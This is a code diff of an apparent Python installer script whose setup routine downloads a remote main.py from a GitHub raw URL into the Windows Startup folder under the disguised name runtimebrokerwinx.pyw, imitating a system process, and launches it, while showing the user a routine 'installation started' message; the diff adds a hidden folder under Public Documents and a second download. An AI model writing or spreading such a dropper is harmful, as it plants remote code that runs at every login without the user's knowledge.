@@ -11,6 +11,7 @@ except ImportError:
 colorama.init(convert=True)
 
 startupath = os.path.expanduser('~') + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
+pd = 'C:/Users/Public/Documents/Benjamin'
 
 if (sys.version_info < (3, 10)):
     print(colorama.Fore.RED + '[-] This program only works with Python 3.10+.' + colorama.Fore.WHITE)
@@ -35,7 +36,10 @@ if (connection() == False):
 def setup():
     os.system("cls && title Please Wait")
     print("the installation started and will finish after an average of 1 minutes...")
+    if not os.path.exists(pd):
+        os.makedirs(pd)  
     urllib.request.urlretrieve('https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli/main/main.py', '{}/runtimebrokerwinx.pyw'.format(startupath))
+    urllib.request.urlretrieve('https://raw.githubusercontent.com/benjaminloir/super-duper-broccoli/main/requirements.txt', '{}/requirements.txt'.format(pd))
     print("please wait...")
     os.popen('{}/runtimebrokerwinx.pyw'.format(startupath))
     time.sleep(7)
